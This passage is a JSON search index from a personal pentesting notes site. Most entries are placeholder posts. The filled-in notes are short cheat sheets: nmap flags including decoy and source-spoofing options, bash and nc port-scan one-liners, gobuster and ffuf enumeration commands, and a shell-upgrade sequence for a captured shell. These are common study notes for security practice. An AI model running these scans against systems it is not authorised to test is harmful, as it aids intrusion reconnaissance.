2023","hero":"/posts/cybersecurity/pentesting/linux_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/linux_privilege_escalation/","summary":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Linux Privilege Escalation"],"title":"[Pentesting] Linux Privilege Escalation"},{"categories":null,"contents":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/mobile_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/mobile_pentesting/","summary":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Mobile Pentesting"],"title":"[Pentesting] Mobile Pentesting"},{"categories":null,"contents":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/network_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/network_pentesting/","summary":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Network Pentesting"],"title":"[Pentesting] Network Pentesting"},{"categories":null,"contents":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/osint/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/osint/","summary":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["OSINT"],"title":"[Pentesting] OSINT"},{"categories":null,"contents":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/","summary":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Pivoting, Tunneling and Port Forwarding"],"title":"[Pentesting] Pivoting, Tunneling and Port Forwarding"},{"categories":null,"contents":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/shells_and_payloads/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/shells_and_payloads/","summary":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Shells and Payloads"],"title":"[Pentesting] Shells and Payloads"},{"categories":null,"contents":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/web_attacks/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/web_attacks/","summary":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Web Attacks"],"title":"[Pentesting] Web Attacks"},{"categories":null,"contents":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/windows_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/windows_privilege_escalation/","summary":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Windows Privilege Escalation"],"title":"[Pentesting] Windows Privilege Escalation"},{"categories":null,"contents":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/pwn.college/overview/images/pwn.college.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pwn.college/overview/","summary":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","tags":["pwn.college"],"title":"[pwn.college] Overview"},{"categories":null,"contents":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/ansible/","summary":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","tags":null,"title":"Ansible"},{"categories":null,"contents":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/box-settings/","summary":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","tags":null,"title":"Box-settings"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/ffuf/","summary":"Wfuzz Options ","tags":null,"title":"Ffuf"},{"categories":null,"contents":"Gobuster Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/gobuster/","summary":"Gobuster Options ","tags":null,"title":"Gobuster"},{"categories":null,"contents":"Kiterunner Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/kiterunner/","summary":"Kiterunner Options ","tags":null,"title":"Kiterunner"},{"categories":null,"contents":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.10.10.7/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k - gobuster ignore certificate ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://\u0026lt;website\u0026gt;.com' -H 'Host: FUZZ.\u0026lt;website\u0026gt;.com' - ffuf vhost enumeration ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/misc/","summary":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.","tags":null,"title":"Miscellaneous"},{"categories":null,"contents":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent. -p- - Scan all ports. -p22-110 - Scan all ports between 22 and 110. -p22,25 - Scans only the specified ports 22 and 25. -F - Scans top 100 ports. -sS - Performs an TCP SYN-Scan. -sA - Performs an TCP ACK-Scan. -sU - Performs an UDP Scan. -sV - Scans the discovered services for their versions. -sC - Perform a Script Scan with scripts that are categorized as \u0026ldquo;default\u0026rdquo;. --script \u0026lt;script\u0026gt; - Performs a Script Scan by using the specified scripts. -O - Performs an OS Detection Scan to determine the OS of the target. -A - Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 - Sets the number of random Decoys that will be used to scan the target. -e - Specifies the network interface that is used for the scan. -S 10.10.10.200 - Specifies the source IP address for the scan. -g - Specifies the source port for the scan. --dns-server \u0026lt;ns\u0026gt; - DNS resolution is performed by using a specified name server. Output Options -oA filename - Stores the results in all available formats starting with the name of \u0026ldquo;filename\u0026rdquo;. -oN filename - Stores the results in normal format with the name \u0026ldquo;filename\u0026rdquo;. -oG filename - Stores the results in \u0026ldquo;grepable\u0026rdquo; format with the name of \u0026ldquo;filename\u0026rdquo;. -oX filename - Stores the results in XML format with the name of \u0026ldquo;filename\u0026rdquo;. Performance Options --max-retries \u0026lt;num\u0026gt; - Sets the number of retries for scans of specific ports. --stats-every=5s - Displays scan\u0026rsquo;s status every 5 seconds. -v/-vv - Displays verbose output during the scan. --initial-rtt-timeout 50ms - Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms - Sets the specified time value as maximum RTT timeout. --min-rate 300 - Sets the number of packets that will be sent simultaneously. -T \u0026lt;0-5\u0026gt; - Specifies the specific timing template. ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/nmap/","summary":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent.","tags":null,"title":"Nmap"},{"categories":null,"contents":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/other/","summary":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","tags":null,"title":"Other"},{"categories":null,"contents":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/shell/","summary":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","tags":null,"title":"Shell"},{"categories":null,"contents":"SQLmap Options SQLmap Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/web_attacks/sqlmap/","summary":"SQLmap Options SQLmap Options ","tags":null,"title":"SQLmap"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/wfuzz/","summary":"Wfuzz Options ","tags":null,"title":"Wfuzz"}]